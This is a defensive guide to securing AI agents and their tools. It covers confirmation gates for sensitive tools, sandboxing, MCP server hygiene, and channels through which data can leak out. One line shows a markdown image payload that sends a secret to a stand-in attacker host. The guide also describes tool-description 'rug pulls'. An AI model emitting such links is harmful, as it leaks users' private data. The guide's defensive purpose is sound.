# Agent & tool safety patterns

## Tool design checklist
- [ ] The tool receives the caller's identity/tenant from trusted runtime context, not from model-provided arguments.
- [ ] Inputs validated with a strict schema (types, lengths, enums, regex for IDs).
- [ ] Output is minimal (no secrets, tokens, internal fields) and marked as data.
- [ ] Read-only where possible. Write tools are separate and gated.
- [ ] Destructive/irreversible/external-effect tools require explicit user confirmation, with exact arguments shown.
- [ ] Rate-limited and logged (actor, tool, args hash, result, latency).
- [ ] Timeouts and resource limits. Errors don't leak stack traces into the model context.

## Confirmation gate (pseudo-code)
```python
SENSITIVE = {"send_email", "transfer_funds", "delete_record", "run_shell", "merge_pr"}

async def dispatch(call, ctx):
    tool = REGISTRY.get(call.name)
    if tool is None:
        return {"error": "unknown_tool"}
    args = tool.schema.model_validate(call.arguments)          # strict pydantic model, extra="forbid"
    if call.name in SENSITIVE and not await ctx.user_confirms(call.name, args):
        return {"error": "user_declined"}
    return await tool.run(args, ctx=ctx)                       # ctx carries user_id / tenant / scoped creds
```

## Exfiltration channels to close
- Markdown/HTML images and links rendered from model output (`![x](https://evil/?q=SECRET)`): block remote images or proxy them with an allowlist.
- Web-fetch tools: domain allowlist. No fetching URLs that the model constructed from private data.
- Email/message tools: restrict recipients to verified contacts, or require approval.
- Code execution sandboxes: no network egress by default.

## Code-execution sandboxes
Use a container with seccomp/gVisor, Firecracker microVMs, or WASM (Pyodide, wasmtime) with no secrets mounted, a read-only base, an ephemeral FS, CPU/memory/time quotas, and network off (or proxied through an allowlist).

## MCP specifics
- Remote servers: OAuth 2.1 with PKCE, audience-bound tokens (resource indicators), and no passing client tokens through to upstream APIs.
- Local HTTP/SSE servers: bind to localhost, validate `Origin`, require a session token.
- Review third-party servers before installing. Pin versions. Watch for tool description changes ("rug pulls").
- Don't give one server's tools access to another server's credentials.
